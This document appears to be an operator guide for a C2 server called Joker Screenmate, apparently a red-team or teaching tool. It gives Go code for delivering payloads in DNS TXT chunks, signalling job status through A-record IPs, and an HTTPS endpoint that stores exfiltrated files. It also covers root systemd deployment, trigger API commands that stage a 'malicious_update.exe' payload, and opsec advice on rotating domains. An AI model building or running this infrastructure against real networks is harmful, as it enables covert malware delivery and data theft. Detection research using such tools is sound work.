# Joker Screenmate Server Guide

This guide covers setting up, configuring, and operating the Joker Screenmate C2 server.

## Overview

The server runs three integrated services:

| Service | Port | Purpose |
|---------|------|---------|
| DNS Server | 53 | Beacon responses, TXT payload delivery |
| HTTPS Server | 8443 | File exfiltration receiver |
| Trigger API | 9090 | Operator command interface (localhost) |

## Prerequisites

### System Requirements

- Go 1.25 or higher
- Linux server (recommended)
- Root privileges (port 53)
- Open firewall: 53/UDP, 8443/TCP

### Domain Setup

1. **Register a domain** (e.g., `timeserversync.com`)
2. **Configure NS records** at registrar pointing to your server IP
3. **Wait for propagation** (up to 48 hours)

```
ns1.timeserversync.com  →  YOUR_SERVER_IP
ns2.timeserversync.com  →  YOUR_SERVER_IP
```

## Installation

### Building the Server

```bash
# Clone repository
git clone https://github.com/faanross/joker_screenmate.git
cd joker_screenmate

# Install dependencies
go mod download

# Build server
GOOS=linux go build -o server ./cmd/server
```

### Directory Structure

```
joker_screenmate/
├── server              # Compiled binary
├── certs/              # Auto-generated TLS certificates
│   ├── cert.pem
│   └── key.pem
├── payloads/           # Payload files
│   └── payload.jpg     # Default payload
└── exfiltrated/        # Received files
```

## Configuration

### Server Constants

Edit `cmd/server/main.go` before building:

```go
const (
    Domain      = "timeserversync.com"
    PayloadFile = "./payloads/payload.jpg"
    CertDir     = "./certs"
    DNSPort     = 53
    HTTPSPort   = 8443
    TriggerPort = 9090
    ExfilDir    = "./exfiltrated"
)
```

| Constant | Description | Default |
|----------|-------------|---------|
| `Domain` | C2 domain name | `timeserversync.com` |
| `PayloadFile` | Default payload path | `./payloads/payload.jpg` |
| `CertDir` | TLS certificate directory | `./certs` |
| `DNSPort` | DNS server port | `53` |
| `HTTPSPort` | HTTPS server port | `8443` |
| `TriggerPort` | Trigger API port | `9090` |
| `ExfilDir` | Exfiltrated files directory | `./exfiltrated` |

## Running the Server

### Basic Startup

```bash
# Requires root for port 53
sudo ./server
```

### Expected Output

```
[DNS] Starting authoritative DNS server on :53
[HTTPS] Starting HTTPS server on :8443
[HTTPS] Auto-generating self-signed certificates
[API] Trigger API listening on localhost:9090
[DNS] Ready to receive queries for timeserversync.com
```

### Running as Service

Create systemd service `/etc/systemd/system/joker-c2.service`:

```ini
[Unit]
Description=Joker C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/joker_screenmate
ExecStart=/opt/joker_screenmate/server
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl enable joker-c2
sudo systemctl start joker-c2
```

## Operator Interface

### Trigger API

The Trigger API runs on localhost:9090 for operator commands.

#### Trigger Default Payload

```bash
curl -X POST http://localhost:9090/trigger
```

Response:
```json
{"status": "Job triggered", "payload": "./payloads/payload.jpg", "chunks": 42}
```

#### Trigger Custom Payload

```bash
curl -X POST "http://localhost:9090/trigger?file=/path/to/custom.bin"
```

#### Check Job Status

```bash
curl http://localhost:9090/status
```

Response (no job):
```json
{"status": "NO_JOB"}
```

Response (job pending):
```json
{"status": "JOB_PENDING", "chunks_remaining": 35, "chunks_total": 42}
```

### Workflow Example

```bash
# 1. Start server
sudo ./server

# 2. Prepare payload
cp malicious_update.exe payloads/

# 3. Trigger job
curl -X POST "http://localhost:9090/trigger?file=./payloads/malicious_update.exe"

# 4. Monitor status
watch -n 5 'curl -s http://localhost:9090/status'

# 5. Check exfiltrated files
ls -la exfiltrated/
```

## DNS Server Details

### Supported Record Types

| Type | Purpose | Subdomain |
|------|---------|-----------|
| A | Beacon/Job status | Any (rotated) |
| TXT | Payload delivery | `verify` |

### A Record Response Logic

```go
func (s *Server) handleAQuery(m *dns.Msg, q dns.Question) {
    var ip net.IP
    if s.jobPending {
        ip = protocol.GenerateJobIP()      // 203.0.113.x
    } else {
        ip = protocol.GenerateNoJobIP()    // 198.51.100.x
    }

    rr := &dns.A{
        Hdr: dns.RR_Header{
            Name:   q.Name,
            Rrtype: dns.TypeA,
            Class:  dns.ClassINET,
            Ttl:    protocol.TTL,
        },
        A: ip,
    }
    m.Answer = append(m.Answer, rr)
}
```

### TXT Record Response Logic

```go
func (s *Server) handleTXTQuery(m *dns.Msg, q dns.Question) {
    s.mu.Lock()
    defer s.mu.Unlock()

    var txt string
    if s.currentChunk < len(s.payloadChunks) {
        txt = s.payloadChunks[s.currentChunk]
        s.currentChunk++
    } else {
        // Transfer complete
        txt = ""
        s.jobPending = false
        s.transferDone = true
    }

    rr := &dns.TXT{
        Hdr: dns.RR_Header{
            Name:   q.Name,
            Rrtype: dns.TypeTXT,
            Class:  dns.ClassINET,
            Ttl:    protocol.TTL,
        },
        Txt: []string{txt},
    }
    m.Answer = append(m.Answer, rr)
}
```

## HTTPS Server Details

### Certificate Generation

Certificates are auto-generated on first run:

```go
func (s *Server) ensureCertificates(certFile, keyFile string) error {
    // Generate RSA 2048-bit key
    privateKey, _ := rsa.GenerateKey(rand.Reader, 2048)

    // Create self-signed certificate
    template := x509.Certificate{
        SerialNumber: big.NewInt(1),
        Subject: pkix.Name{
            CommonName: "localhost",
        },
        NotBefore: time.Now(),
        NotAfter:  time.Now().Add(365 * 24 * time.Hour),
        KeyUsage:  x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
    }

    certDER, _ := x509.CreateCertificate(rand.Reader, &template, &template,
        &privateKey.PublicKey, privateKey)

    // Save as PEM files
    // ...
}
```

### Upload Handler

```go
func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // Get filename from header
    filename := r.Header.Get("X-Filename")
    if filename == "" {
        filename = "unknown"
    }

    // Add timestamp prefix
    timestamp := time.Now().Format("20060102-150405")
    outputPath := filepath.Join(s.outputDir, timestamp+"_"+filename)

    // Stream to disk
    file, _ := os.Create(outputPath)
    defer file.Close()

    written, _ := io.Copy(file, r.Body)

    log.Printf("[HTTPS] Received %s (%d bytes)", filename, written)
    w.WriteHeader(http.StatusOK)
}
```

## Monitoring

### Server Logs

```
[DNS] Query from 192.168.1.100: www.timeserversync.com A
[DNS] Response: 198.51.100.42 (NO_JOB)
[DNS] Query from 192.168.1.100: api.timeserversync.com A
[DNS] Response: 203.0.113.17 (JOB)
[DNS] Query from 192.168.1.100: verify.timeserversync.com TXT
[DNS] Response: Chunk 1/42
[HTTPS] Upload started from 192.168.1.100
[HTTPS] Received employees_dir.zip (1048576 bytes)
```

### Metrics

Monitor these indicators:

| Metric | Normal | Alert Threshold |
|--------|--------|-----------------|
| A queries/minute | 0.1-0.2 | >1 |
| TXT queries/minute | 0 (burst during job) | Sustained >10 |
| Upload frequency | Rare | Multiple/day |

## Troubleshooting

### Port 53 in Use

```bash
# Find process using port 53
sudo lsof -i :53

# On Ubuntu, disable systemd-resolved
sudo systemctl disable systemd-resolved
sudo systemctl stop systemd-resolved
```

### DNS Not Resolving

1. Verify NS records at registrar
2. Test direct query:
   ```bash
   dig @YOUR_SERVER_IP www.timeserversync.com
   ```
3. Check firewall allows UDP 53

### TXT Transfer Stalls

1. Check server logs for errors
2. Verify agent is querying directly (not via resolver)
3. Confirm job is triggered

### Certificate Errors

```bash
# Regenerate certificates
rm -rf certs/
./server  # Will auto-generate
```

## Security Considerations

### Operational Security

1. **Use dedicated infrastructure**
2. **Rotate domains regularly**
3. **Monitor for scanning attempts**
4. **Limit trigger API to localhost**

### Network Indicators

The server generates:
- DNS responses with RFC 5737 IPs
- TXT records with base64 data
- Self-signed HTTPS certificates
- Files in exfiltrated directory

## Next Steps

- [Agent Guide](agent-guide.md) - Deploying agents
- [Detection Guide](detection-guide.md) - Detection strategies
- [Protocol](protocol.md) - Protocol specification
